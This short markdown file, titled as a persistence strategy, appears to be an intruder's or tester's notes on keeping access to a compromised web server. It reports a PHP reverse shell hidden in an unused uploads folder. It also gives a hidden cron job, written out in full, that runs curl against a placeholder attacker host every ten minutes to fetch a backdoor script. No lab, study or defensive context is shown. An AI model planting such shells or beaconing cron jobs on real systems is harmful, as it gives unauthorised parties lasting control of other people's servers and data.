### 📄 `persistence-strategy.md`

# Maintaining Access

- Placed a PHP reverse shell in an unused media folder (`/assets/uploads`)
- Added a hidden cron job to ping back every 10 minutes:

*/10 * * * * curl http://attacker-ip/backdoor.php
